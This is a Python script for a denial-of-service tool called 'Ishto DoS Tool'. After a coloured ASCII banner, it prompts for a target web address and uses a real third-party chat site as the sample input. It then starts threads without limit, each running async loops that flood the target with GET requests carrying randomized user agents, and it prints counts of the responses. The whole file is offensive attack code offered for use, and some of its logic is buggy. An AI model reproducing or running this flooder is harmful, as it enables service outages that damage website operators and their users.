import threading
import aiohttp
import asyncio
import sys
import time
from pystyle import *
import os
import user_agent
from colorama import Fore, Style, init

# Initialize colorama
init()

# Define the function for Ishto DoS Tool
def ishto_dos_tool():
    global reqs

    # Define headers for HTTP requests
    headers = {
        "User-Agent": user_agent.generate_user_agent()
    }

    # Clear screen based on the operating system
    osystem = sys.platform
    if osystem == "linux":
        os.system("clear")
    else:
        os.system("cls")

    # Display Ishto DoS ASCII banner
    ascii = '''
  ####  ######  ##     ## ########  #######     ########   #######   ######  
 ##  ##    ## ##     ##    ##    ##     ##    ##     ## ##     ## ##    ## 
 ##  ##       ##     ##    ##    ##     ##    ##     ## ##     ## ##       
 ##   ######  #########    ##    ##     ##    ##     ## ##     ##  ######  
 ##        ## ##     ##    ##    ##     ##    ##     ## ##     ##       ## 
 ##  ##    ## ##     ##    ##    ##     ##    ##     ## ##     ## ##    ## 
####  ######  ##     ##    ##     #######     ########   #######   ######  
               ~    Ishto    ~
             
    '''

    banner = "v1 "

    banner = Add.Add(ascii, banner, center=True)

    print(Colorate.Horizontal(Colors.red_to_blue, banner))

    num = 0
    reqs = []

    # Create a new event loop for asyncio
    loop = asyncio.new_event_loop()

    r = 0

    try:
        # Take user input for the target web URL with color
        url = input(f"{Fore.YELLOW}\tEnter Web Url ( https://chat.openai.com/ )->{Style.RESET_ALL} ")
        print()

        # Add "http://" if not present in the URL
        if not url.startswith("http") and not url.startswith("https"):
            url = "http://" + url

    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return

    async def fetch(session, url):
        """
        Asynchronous function to make HTTP requests to the target URL.

        Args:
            session (aiohttp.ClientSession): A client session for making HTTP requests.
            url (str): The target URL.

        Returns:
            None
        """
        global r, reqs
        start = int(time.time())
        while True:
            try:
                async with session.get(url, headers=headers) as response:
                    if response:
                        set_end = int(time.time())
                        set_final = start - set_end
                        final = str(set_final).replace("-", "")

                        if response.status == 200:
                            r += 1
                        reqs.append(response.status)
                        sys.stdout.write(f"Requests : {str(len(reqs))} | Time : {final} | Response Status Code => {str(response.status)}\r")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
                return

    urls = []
    urls.append(url)

    async def main():
        tasks = []
        async with aiohttp.ClientSession() as session:
            for url in urls:
                tasks.append(fetch(session, url))
            ddos = await asyncio.gather(*tasks)

    def run():
        loop.run_forever(asyncio.run(main()))

    if __name__ == '__main__':
        active = []
        ths = []
        while True:
            try:
                while True:
                    th = threading.Thread(target=run)
                    try:
                        th.start()
                        ths.append(th)
                        sys.stdout.flush()
                    except RuntimeError:
                        pass
            except:
                pass

# Call the Ishto DoS function
ishto_dos_tool()
